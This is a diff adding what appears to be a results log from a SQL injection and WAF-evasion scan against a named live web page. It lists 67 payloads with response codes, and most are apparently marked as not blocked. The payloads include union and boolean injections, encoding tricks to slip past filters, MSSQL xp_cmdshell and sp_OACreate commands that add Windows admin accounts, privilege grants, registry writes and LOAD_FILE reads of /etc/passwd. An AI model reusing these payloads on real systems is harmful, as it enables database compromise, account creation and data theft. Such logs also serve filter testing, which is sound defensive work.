@@ -1,0 +1,203 @@
++++++++++++[The result]+++++++++++
+
+-------------
+http://www.zoosnet.net/default.aspx
+[!!] 1 : 200   usecase:1 and 1=1
+-------------
+http://www.zoosnet.net/default.aspx
+[OK] 2 : 400   usecase:1 or 'ab'='ab
+-------------
+http://www.zoosnet.net/default.aspx
+[!!] 3 : 200   usecase:1 and ord(mid(version(),1,1))>51/*
+-------------
+http://www.zoosnet.net/default.aspx
+[!!] 4 : 200   usecase:1 order by 10--
+-------------
+http://www.zoosnet.net/default.aspx
+[OK] 5 : 400   usecase:1 ;select BENCHMARK(100000,SHA1('true')), false);--
+-------------
+http://www.zoosnet.net/default.aspx
+[!!] 6 : 200   usecase:1 having 1=1
+-------------
+http://www.zoosnet.net/default.aspx
+[!!] 7 : 200   usecase:1 GROUP BY colume_got having 1=1
+-------------
+http://www.zoosnet.net/default.aspx
+[!!] 8 : 200   usecase:1 ;create table cmd(a text)
+-------------
+http://www.zoosnet.net/default.aspx
+[!!] 9 : 200   usecase:1 "UNION%20%28SELECT%201,username,3,4,passwd,6,7,8,9,10,11,12,13,14,15,16,17,18%20from%28admin%29%29
+-------------
+http://www.zoosnet.net/default.aspx
+[!!] 10 : 200   usecase:1 =-9%0Aunion%0Aselect 1,2,3,4"
+-------------
+http://www.zoosnet.net/default.aspx
+[OK] 11 : 400   usecase:1 null union all select 1,user(),3,4,5/*
+-------------
+http://www.zoosnet.net/default.aspx
+[OK] 12 : 400   usecase:1 ;insert into user(username,password) values('xxxx',' xxxx'),('dddd','dddd')/* ');
+-------------
+http://www.zoosnet.net/default.aspx
+[!!] 13 : 200   usecase:1
+-------------
+http://www.zoosnet.net/default.aspx
+[!!] 14 : 200   usecase:1 and 1=(Select IS_MEMBER('db_owner'))
+-------------
+http://www.zoosnet.net/default.aspx
+[OK] 15 : 400   usecase:1 And char(124)%2BCast(IS_MEMBER('db_owner') as varchar(1))%2Bchar(124)=1 ;--
+-------------
+http://www.zoosnet.net/default.aspx
+[!!] 16 : 200   usecase:1 and 1= (Select HAS_DBACCESS('master'))
+-------------
+http://www.zoosnet.net/default.aspx
+[OK] 17 : 400   usecase:1 And char(124)%2BCast(HAS_DBACCESS('master') as varchar(1))%2Bchar(124)=1 --
+-------------
+http://www.zoosnet.net/default.aspx
+[!!] 18 : 200   usecase:1 and char(124)%2Buser%2Bchar(124)=0
+-------------
+http://www.zoosnet.net/default.aspx
+[!!] 19 : 200   usecase:1 and user>0
+-------------
+http://www.zoosnet.net/default.aspx
+[!!] 20 : 200   usecase:1 and 1=(select IS_SRVROLEMEMBER('sysadmin'));--
+-------------
+http://www.zoosnet.net/default.aspx
+[!!] 21 : 200   usecase:1 And char(124)%2BCast(IS_SRVROLEMEMBER(0x730079007300610064006D0069006E00) as varchar(1))%2Bchar(124)=1 --
+-------------
+http://www.zoosnet.net/default.aspx
+[OK] 22 : 400   usecase:1 and exists (select * from sysobjects);--
+-------------
+http://www.zoosnet.net/default.aspx
+[OK] 23 : 400   usecase:1 ;declare @d int;--
+-------------
+http://www.zoosnet.net/default.aspx
+[OK] 24 : 400   usecase:1 ;exec master..dbo.sp_addextendedproc 'xp_cmdshell','xplog70.dll';--
+-------------
+http://www.zoosnet.net/default.aspx
+[OK] 25 : 400   usecase:1 select * from openrowset('sqloledb','server=192.168.1.200,1433;uid=test;pwd=pafpaf','select @@version')
+-------------
+http://www.zoosnet.net/default.aspx
+[!!] 26 : 200   usecase:1 exec master..xp_regwrite 'HKEY_LOCAL_MACHINE','SOFTWARE\Microsoft\Jet\4.0\Engines','SandBoxMode','REG_DWORD',1
+-------------
+http://www.zoosnet.net/default.aspx
+[!!] 27 : 200   usecase:1 select * from openrowset('microsoft.jet.oledb.4.0',';database=c:\winnt\system32\ias\ias.mdb','select  shell
+-------------
+http://www.zoosnet.net/default.aspx
+[!!] 28 : 200   usecase:1 ("cmd.exe /c net user admin admin1234 /add")')
+-------------
+http://www.zoosnet.net/default.aspx
+[OK] 29 : 400   usecase:1 ";DECLARE @shell INT EXEC SP_OAcreate 'wscript.shell',@shell OUTPUT EXEC SP_OAMETHOD @shell,'run',null, 'C:
+-------------
+http://www.zoosnet.net/default.aspx
+[!!] 30 : 200   usecase:1 \WINNT\system32\cmd.exe /c net user paf pafpaf /add';--"
+-------------
+http://www.zoosnet.net/default.aspx
+[!!] 31 : 200   usecase:1 EXEC [master].[dbo].[xp_cmdshell] 'cmd /c md c:\1111'
+-------------
+http://www.zoosnet.net/default.aspx
+[OK] 32 : 400   usecase:1 and 1=(Select count(*) FROM master.dbo.sysobjects Where xtype = 'X' AND name = 'xp_cmdshell')
+-------------
+http://www.zoosnet.net/default.aspx
+[!!] 33 : 200   usecase:1 exec master..xp_dirtree 'c:\winnt\system32\',1,1
+-------------
+http://www.zoosnet.net/default.aspx
+[OK] 34 : 400   usecase:1 And (Select char(124)%2BCast(Count(1) as varchar(8000))%2Bchar(124) From D99_Tmp)=0 ;--
+-------------
+http://www.zoosnet.net/default.aspx
+[!!] 35 : 200   usecase:1 exec master.dbo.sp_addsrvrolemember test,sysadmin
+-------------
+http://www.zoosnet.net/default.aspx
+[!!] 36 : 200   usecase:1 GRANT exec On xp_proxiedadata TO public
+-------------
+http://www.zoosnet.net/default.aspx
+[!!] 37 : 200   usecase:1 Create TABLE biao(id int NULL,name nvarchar(256) null);
+-------------
+http://www.zoosnet.net/default.aspx
+[!!] 38 : 200   usecase:1 select name from master.dbo.sysdatabases
+-------------
+http://www.zoosnet.net/default.aspx
+[!!] 39 : 200   usecase:1 SELECT version FROM v$instance;
+-------------
+http://www.zoosnet.net/default.aspx
+[!!] 40 : 200   usecase:1 SELECT @@version
+-------------
+http://www.zoosnet.net/default.aspx
+[!!] 41 : 200   usecase:1 SELECT /*comment*/1
+-------------
+http://www.zoosnet.net/default.aspx
+[!!] 42 : 200   usecase:1 SELECT user_name();
+-------------
+http://www.zoosnet.net/default.aspx
+[!!] 43 : 200   usecase:1 SELECT system_user;
+-------------
+http://www.zoosnet.net/default.aspx
+[!!] 44 : 200   usecase:1 SELECT DB_NAME()
+-------------
+http://www.zoosnet.net/default.aspx
+[!!] 45 : 200   usecase:1 SELECT char(0x41)
+-------------
+http://www.zoosnet.net/default.aspx
+[!!] 46 : 200   usecase:1 IF (1=1) SELECT 1 ELSE SELECT 2
+-------------
+http://www.zoosnet.net/default.aspx
+[!!] 47 : 200   usecase:1 SELECT CASE WHEN 1=1 THEN 1 ELSE 2 END
+-------------
+http://www.zoosnet.net/default.aspx
+[OK] 48 : 400   usecase:1 WAITFOR DELAY '0:0:5'
+-------------
+http://www.zoosnet.net/default.aspx
+[OK] 49 : 400   usecase:1 declare @host varchar(800);
+-------------
+http://www.zoosnet.net/default.aspx
+[!!] 50 : 200   usecase:1 SELECT HOST_NAME()
+-------------
+http://www.zoosnet.net/default.aspx
+[OK] 51 : 400   usecase:1  UNION ALL SELECT LOAD_FILE('/etc/passwd')
+-------------
+http://www.zoosnet.net/default.aspx
+[!!] 52 : 200   usecase:1 GRANT ALL PRIVILEGES ON *.* TO test1@'%';
+-------------
+http://www.zoosnet.net/default.aspx
+[!!] 53 : 200   usecase:1 SELECT @@datadir;
+-------------
+http://www.zoosnet.net/default.aspx
+[!!] 54 : 200   usecase:1 SELECT cast('1' AS unsigned integer);
+-------------
+http://www.zoosnet.net/default.aspx
+[!!] 55 : 200   usecase:1 or 2=2%2D%2D
+-------------
+http://www.zoosnet.net/default.aspx
+[!!] 56 : 200   usecase:1 /**/and/**/1=1
+-------------
+http://www.zoosnet.net/default.aspx
+[!!] 57 : 200   usecase:1 %20a%%%nd%201=1
+-------------
+http://www.zoosnet.net/default.aspx
+[!!] 58 : 200   usecase:1 %0aand%0a1=1
+-------------
+http://www.zoosnet.net/default.aspx
+[!!] 59 : 200   usecase:1 a%n%d 1=1
+-------------
+http://www.zoosnet.net/default.aspx
+[!!] 60 : 200   usecase:1 %01and%011=1
+-------------
+http://www.zoosnet.net/default.aspx
+[!!] 61 : 200   usecase:1 and (se%%lect top 1 password from [admin])=0
+-------------
+http://www.zoosnet.net/default.aspx
+[!!] 62 : 200   usecase:1 /*!union*/ /*!select*/  user,password /*!from*/ mysql.user
+-------------
+http://www.zoosnet.net/default.aspx
+[OK] 63 : 400   usecase:1 /**/union/**/select/**/1,load_file(0x633A5C626F6F742E696E69),3/*
+-------------
+http://www.zoosnet.net/default.aspx
+[!!] 64 : 200   usecase:1 ?id=1 un%u0069on sel%u0065ct pass f%u0072om admin li%u006dit 1
+-------------
+http://www.zoosnet.net/default.aspx
+[!!] 65 : 200   usecase:1 %61nd 1=1
+-------------
+http://www.zoosnet.net/default.aspx
+[!!] 66 : 200   usecase:1 &id=union&id=select&id=1,2&id=from%20mysql.user
+-------------
+http://www.zoosnet.net/default.aspx
+[OK] 67 : 400   usecase:1 ?id=1 union select 1&id=pass from admin
